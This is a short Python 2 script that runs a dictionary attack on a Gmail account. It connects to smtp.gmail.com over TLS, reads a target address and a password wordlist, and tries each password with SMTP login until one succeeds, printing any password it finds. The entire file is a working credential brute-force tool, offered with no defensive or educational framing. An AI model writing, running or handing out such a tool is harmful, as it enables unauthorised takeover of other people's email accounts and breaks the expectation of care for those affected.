import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("email address: ")
passwfile = raw_input("passwfile: ")
passwfile = open(passwfile, "r")

for password in passwfile:
    try:
            smtpserver.login(user, password)

            print "[+] Password Found: %s" % password
            break;
    except smtplib.SMTPAuthenticationError:
            print "[!] Password Incorrect: %s" % password
